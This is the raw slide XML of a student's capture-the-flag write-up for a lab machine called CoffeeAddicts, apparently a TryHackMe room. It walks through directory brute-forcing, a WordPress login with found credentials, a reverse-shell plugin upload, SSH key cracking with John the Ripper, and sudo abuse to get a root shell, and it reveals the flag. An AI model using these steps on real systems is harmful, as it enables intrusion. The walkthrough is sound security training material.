                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> user, escalating from the restricted www-data web user to a full interactive system user.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="16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FAED4-3336-8959-141C-8E6784E69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4B62B8-7E41-D6DF-CF8C-692016640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888" y="769938"/>
            <a:ext cx="7304762" cy="5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96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CA05944-0254-2BE0-9240-843A4C41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7" y="9525"/>
            <a:ext cx="4391724" cy="64071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Privilege Escalation to Root</a:t>
            </a:r>
            <a:b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Method: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Sudo misconfiguration allowed executing a custom binary as root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1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Result: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✅ Root access achieved → Flag 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quote-cjk-patch"/>
              </a:rPr>
              <a:t>captured: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THM{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im_the_shell_master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}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00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t># Check </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> rights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sudo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 -l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Matching Defaults entries for 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badbyte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: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    (root) /opt/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BadByte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/shell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00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t># Execute as root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sudo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 -u root /opt/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BadByte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/shell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BadByte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 # python3 -c "import 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os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; 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os.system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('/bin/bash')"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00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t># Root achieved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root@CoffeeAdicts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:/# cat /root/root.txt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THM{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Menlo"/>
              </a:rPr>
              <a:t>im_the_shell_master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}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b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</a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t># ✅ FLAG CAPTURED</a:t>
            </a:r>
            <a:b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en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/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68073-E1C4-C8A0-80F1-7DC69A886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CB61A7-7E32-E5CA-3AB8-41644A7D3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451" y="198849"/>
            <a:ext cx="7304762" cy="6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2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KE"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grp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61375F2-60B1-44ED-B60A-019C4BD5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KE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4F83C82-D757-A54C-23B3-A95E0E4E9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64028"/>
            <a:ext cx="9905998" cy="52607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4800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Algerian" panose="04020705040A02060702" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>Final Attack Visualization</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000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7F90A-8348-3915-6284-195FDB647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9076" y="651972"/>
            <a:ext cx="11477624" cy="6031857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🌐 External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├─► http://coffeeaddicts.thm/wordpress/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│       └─► </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>gus:gusineedyouback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t> [Login]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│               └─► Malicious Plugin [Upload]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│                       └─► Reverse Shell [www-data]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│                               └─► SSH Key Found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│                                       └─► Cracked: "password"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│                                               └─► SSH as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>badbyte</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>      │                                                       └─► </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t> /opt/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>BadByte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>/shell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│                                                               └─► Python → Root Shell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│                                                                       └─► 🚩 FLAG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tencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>    └─► Complete System Compromise ✅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485B3F6-654D-4842-A2DE-677D12FE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84" name="Freeform 32">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF4365F4-C63C-4FC2-907B-1F7D414B9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5" name="Freeform 33">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0538225-01AB-41C4-9A02-FE1BD81D6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6" name="Freeform 34">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66942F07-D7CC-49EB-BF73-8B94D5F4F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7" name="Freeform 35">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D3CACE0-3AC7-4A9F-9A3F-1694ACCD4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8" name="Freeform 36">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{19063B47-FBFB-4EA1-A3FB-BECE005F4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89" name="Freeform 37">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B856863B-C809-4C31-94D0-659A91851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90" name="Freeform 38">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{298CB3D7-7373-4AC6-9E2C-4AFDDE28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91" name="Freeform 39">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DE09F1B-2326-4ED3-B63B-A30815DD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92" name="Freeform 40">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2498F244-3CE6-4D90-B5CF-5189DB17D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  <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="93" name="Rectangle 41">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A30DD13-FA10-4B9F-8B4D-97B7287B8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KE"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="65177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D512-6374-A8B2-A67B-6A82A7247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858" y="457200"/>
            <a:ext cx="9416142" cy="3951513"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>                                                              </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>                 </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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CoffeeAddicts</a:t>
            </a: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shows that security isn't about one big      </a:t>
            </a:r>
            <a:b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</a:b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defense - it's about many small ones working together.                                                                  </a:t>
            </a:r>
            <a:b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</a:b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One weak password → WordPress admin                        </a:t>
            </a:r>
            <a:b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</a:b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One malicious plugin → Reverse shell                        </a:t>
            </a:r>
            <a:b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</a:b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One exposed SSH key → User compromise                       </a:t>
            </a:r>
            <a:b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</a:b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One </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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sudo</a:t>
            </a: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misconfiguration → Root access                    </a:t>
            </a:r>
            <a:b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</a:b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                                                              </a:t>
            </a:r>
            <a:b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</a:b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 The strongest coffee can't fix weak security.</a:t>
            </a:r>
            <a:b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</a:br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  <a:latin typeface="Stencil" panose="040409050D0802020404" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:endParaRPr lang="en-KE" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1">
                  <a:lumMod val="85000"/>
                  <a:lumOff val="15000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="Stencil" panose="040409050D0802020404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83A1F-402A-191B-2F01-B4507812059F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="2960914" y="4770116"/>
            <a:ext cx="6074228" cy="55299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  <a:latin typeface="Playbill" panose="040506030A0602020202" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>Done and Documented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Playbill" panose="040506030A0602020202" pitchFamily="82" charset="0"/>
              </a:rPr>
              <a:t>by :  Ryan Brian</a:t>
            </a:r>
            <a:endParaRPr lang="en-KE" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1">
                  <a:lumMod val="85000"/>
                  <a:lumOff val="15000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="Playbill" panose="040506030A06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54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186</TotalTime>
  <Words>1094</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>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Algerian</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Menlo</vt:lpstr>
      <vt:lpstr>Playbill</vt:lpstr>
      <vt:lpstr>quote-cjk-patch</vt:lpstr>
      <vt:lpstr>Stencil</vt:lpstr>
      <vt:lpstr>Tw Cen MT</vt:lpstr>
      <vt:lpstr>Circuit</vt:lpstr>
      <vt:lpstr>Brewing a Reverse Shell : The CoffeeAddicts CTF Challenge  Methodology &amp; Exploitation Path. </vt:lpstr>
      <vt:lpstr>Host discovery usind netdiscover: using the command : sudo netdiscover 192.168.1.0/24  from the screenshot I identified my target machine to be 192.168.1.174</vt:lpstr>
      <vt:lpstr>  Edited /etc/hosts to map coffeeaddicts.thm to the target IP, allowing proper DNS resolution and virtual host access through the web browser  # Command used sudo nano /etc/hosts # Line added 192.168.1.174  coffeeaddicts.thm # Result http://coffeeaddicts.thm  →  resolves to 192.168.1.174</vt:lpstr>
      <vt:lpstr>Directory Bruteforcing with Gobuster Gobuster directory enumeration revealed a hidden WordPress installation at /wordpress, expanding the attack surface beyond the main homepage. # Command used gobuster dir -u http://coffeeaddicts.thm –w /usr/share/wordlists/dirb/common.txt \   -x php,html,txt # Critical finding http://coffeeaddicts.thm/wordpress/  [301 Redirect]</vt:lpstr>
      <vt:lpstr>This the hidden WordPress installation page revealed by the Gobuster directory enumeration </vt:lpstr>
      <vt:lpstr>Accessed WordPress Login Page. Accessed the WordPress login page at wp-login.php and successfully authenticated using compromised credentials ; gus:gusineedyouback. # Login endpoint http://coffeeaddicts.thm/wordpress/wp-login.php  # Credentials Username: gus Password: gusineedyouback  # Result ✅ Access Granted → WordPress Admin Dashboard</vt:lpstr>
      <vt:lpstr> Malicious Plugin Upload  Method: WordPress Plugin Uploader (Plugins → Add New → Upload Plugin) File Uploaded: wp-reverse-shell (1).zip Result: ✅ "Plugin installed successfully“  Using admin privileges, uploaded a malicious ZIP plugin containing reverse shell code, then activated it to establish remote access.  Attack flow:  1. Navigate to Plugins → Add New          ↓ 2. Click "Upload Plugin" button          ↓ 3. Select wp-reverse-shell (1).zip          ↓ 4. Click "Install Now"          ↓ 5. "Plugin installed successfully"          ↓ 6. Click "Activate Plugin" ← Triggers reverse shell!</vt:lpstr>
      <vt:lpstr>Established Reverse Shell. Started a Netcat listener on port 1234 and received an incoming reverse shell connection from the target WordPress server. </vt:lpstr>
      <vt:lpstr>Shell Upgrade with Python PTY Used Python's PTY module to spawn an interactive /bin/bash shell, upgrading from the limited reverse shell for better usability.  Command Used: python3 -c 'import pty;pty.spawn("/bin/bash")’  Result: Upgraded from /bin/sh to /bin/bash with better interactivity </vt:lpstr>
      <vt:lpstr> Encrypted SSH Private Key Discovered an encrypted AES-128-CBC protected SSH private key in /home/badbyte/.ssh/id_rsa, which can be cracked to gain access as the badbyte user Location: /home/badbyte/.ssh/id_rsa Key Type: RSA Private Key (1766 bytes) Encryption: AES-128-CBC (indicated by Proc-Type: 4,ENCRYPTED) </vt:lpstr>
      <vt:lpstr>Cracked SSH Private Key Passphrase Tool Used: John the Ripper Wordlist: /usr/share/wordlists/rockyou.txt (14 million passwords) Result: ✅ Passphrase cracked as password cracking process. # Step 1: Convert SSH key to hash format ssh2john badbyte_key &gt; badbyte_hash # Step 2: Crack with John the Ripper john --wordlist=/usr/share/wordlists/rockyou.txt badbyte_hash # Step 3: Result password    (badbyte_key) Used John the Ripper with the rockyou.txt wordlist to crack the encrypted SSH private key passphrase in under one second, revealing the password 'password'.</vt:lpstr>
      <vt:lpstr>SSH Login as badbyte User Command: ssh badbyte@192.168.1.174 Authentication Method: Password (after cracking the SSH key passphrase) Result: ✅ Successfully logged into badbyte@CoffeeAdicts  Used the cracked passphrase 'password' to authenticate via SSH as the badbyte user, escalating from the restricted www-data web user to a full interactive system user.</vt:lpstr>
      <vt:lpstr>Privilege Escalation to Root Method: Sudo misconfiguration allowed executing a custom binary as root Result: ✅ Root access achieved → Flag captured: THM{im_the_shell_master} # Check sudo rights sudo -l Matching Defaults entries for badbyte:     (root) /opt/BadByte/shell # Execute as root sudo -u root /opt/BadByte/shell BadByte # python3 -c "import os; os.system('/bin/bash')" # Root achieved root@CoffeeAdicts:/# cat /root/root.txt THM{im_the_shell_master}  # ✅ FLAG CAPTURED  </vt:lpstr>
      <vt:lpstr>Final Attack Visualization </vt:lpstr>
      <vt:lpstr>                                                                                   CoffeeAddicts shows that security isn't about one big        defense - it's about many small ones working together.                                                                    One weak password → WordPress admin                          One malicious plugin → Reverse shell                          One exposed SSH key → User compromise                         One sudo misconfiguration → Root access                                                                                       The strongest coffee can't fix weak security.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brian</dc:creator>
  <cp:lastModifiedBy>ryan brian</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-21T08:06:53Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-21T11:13:22Z</dcterms:modified>
</cp:coreProperties>
</file>